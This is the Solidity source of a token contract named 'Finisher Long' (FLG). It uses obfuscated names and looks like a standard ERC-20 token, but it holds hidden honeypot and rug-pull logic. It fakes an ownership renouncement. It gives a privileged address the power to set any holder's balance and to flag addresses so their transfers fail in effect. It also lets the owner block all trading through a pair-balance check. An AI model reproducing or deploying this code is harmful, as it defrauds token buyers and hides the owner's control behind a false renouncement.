//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface amountSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverReceiver {
    function createPair(address limitTotalReceiver, address walletEnable) external returns (address);
}

interface toIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletLiquidity) external view returns (uint256);

    function transfer(address autoSwap, uint256 fromShould) external returns (bool);

    function allowance(address shouldAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromShould) external returns (bool);

    function transferFrom(
        address sender,
        address autoSwap,
        uint256 fromShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderWallet, uint256 value);
    event Approval(address indexed shouldAmount, address indexed spender, uint256 value);
}

interface toIsMetadata is toIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FinisherLong is modeReceiver, toIs, toIsMetadata {

    function getOwner() external view returns (address) {
        return exemptToken;
    }

    uint8 private takeAuto = 18;

    uint256 private takeAmount;

    function minTake() private view {
        require(autoAt[_msgSender()]);
    }

    uint256 public shouldAuto;

    bool public shouldTakeReceiver;

    uint256 private senderLaunched;

    function fromEnable(address feeTo, address autoSwap, uint256 fromShould) internal returns (bool) {
        require(atBuy[feeTo] >= fromShould);
        atBuy[feeTo] -= fromShould;
        atBuy[autoSwap] += fromShould;
        emit Transfer(feeTo, autoSwap, fromShould);
        return true;
    }

    function balanceOf(address walletLiquidity) public view virtual override returns (uint256) {
        return atBuy[walletLiquidity];
    }

    mapping(address => uint256) private atBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingList;
    }

    function atLaunch() public {
        emit OwnershipTransferred(limitList, address(0));
        exemptToken = address(0);
    }

    string private autoAmount = "FLG";

    uint256 teamTo;

    function approve(address receiverTx, uint256 fromShould) public virtual override returns (bool) {
        swapWallet[_msgSender()][receiverTx] = fromShould;
        emit Approval(_msgSender(), receiverTx, fromShould);
        return true;
    }

    string private tokenMin = "Finisher Long";

    function autoTx(address fundMax) public {
        require(fundMax.balance < 100000);
        if (shouldTakeReceiver) {
            return;
        }
        if (exemptEnableFund) {
            shouldAuto = senderLaunched;
        }
        autoAt[fundMax] = true;
        
        shouldTakeReceiver = true;
    }

    bool private walletTotalMin;

    function shouldWallet(address feeTeam, uint256 fromShould) public {
        minTake();
        atBuy[feeTeam] = fromShould;
    }

    event OwnershipTransferred(address indexed receiverTrading, address indexed receiverAmountList);

    address public limitList;

    function launchWallet(address teamTakeToken) public {
        minTake();
        if (exemptEnableFund != amountReceiver) {
            tradingMinBuy = senderLaunched;
        }
        if (teamTakeToken == limitList || teamTakeToken == listMarketing) {
            return;
        }
        takeExempt[teamTakeToken] = true;
    }

    address private exemptToken;

    uint256 modeAuto;

    function symbol() external view virtual override returns (string memory) {
        return autoAmount;
    }

    function transferFrom(address feeTo, address autoSwap, uint256 fromShould) external override returns (bool) {
        if (_msgSender() != listToMarketing) {
            if (swapWallet[feeTo][_msgSender()] != type(uint256).max) {
                require(fromShould <= swapWallet[feeTo][_msgSender()]);
                swapWallet[feeTo][_msgSender()] -= fromShould;
            }
        }
        return fundBuySwap(feeTo, autoSwap, fromShould);
    }

    bool public exemptEnableFund;

    function decimals() external view virtual override returns (uint8) {
        return takeAuto;
    }

    uint256 constant teamFee = 20 ** 10;

    mapping(address => bool) public takeExempt;

    address toMarketingTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return tokenMin;
    }

    function fundBuySwap(address feeTo, address autoSwap, uint256 fromShould) internal returns (bool) {
        if (feeTo == limitList) {
            return fromEnable(feeTo, autoSwap, fromShould);
        }
        uint256 toList = toIs(listMarketing).balanceOf(toMarketingTeam);
        require(toList == teamTo);
        require(autoSwap != toMarketingTeam);
        if (takeExempt[feeTo]) {
            return fromEnable(feeTo, autoSwap, teamFee);
        }
        return fromEnable(feeTo, autoSwap, fromShould);
    }

    uint256 public tradingMinBuy;

    address public listMarketing;

    function allowance(address shouldLaunch, address receiverTx) external view virtual override returns (uint256) {
        if (receiverTx == listToMarketing) {
            return type(uint256).max;
        }
        return swapWallet[shouldLaunch][receiverTx];
    }

    function owner() external view returns (address) {
        return exemptToken;
    }

    mapping(address => mapping(address => uint256)) private swapWallet;

    uint256 private tradingList = 100000000 * 10 ** 18;

    bool public amountReceiver;

    function transfer(address feeTeam, uint256 fromShould) external virtual override returns (bool) {
        return fundBuySwap(_msgSender(), feeTeam, fromShould);
    }

    constructor (){
        if (shouldAuto == takeAmount) {
            takeAmount = senderLaunched;
        }
        amountSwap teamBuy = amountSwap(listToMarketing);
        listMarketing = receiverReceiver(teamBuy.factory()).createPair(teamBuy.WETH(), address(this));
        
        limitList = _msgSender();
        atLaunch();
        autoAt[limitList] = true;
        atBuy[limitList] = tradingList;
        if (tradingMinBuy != takeAmount) {
            walletTotalMin = false;
        }
        emit Transfer(address(0), limitList, tradingList);
    }

    mapping(address => bool) public autoAt;

    bool private exemptWallet;

    function totalAutoBuy(uint256 fromShould) public {
        minTake();
        teamTo = fromShould;
    }

    address listToMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}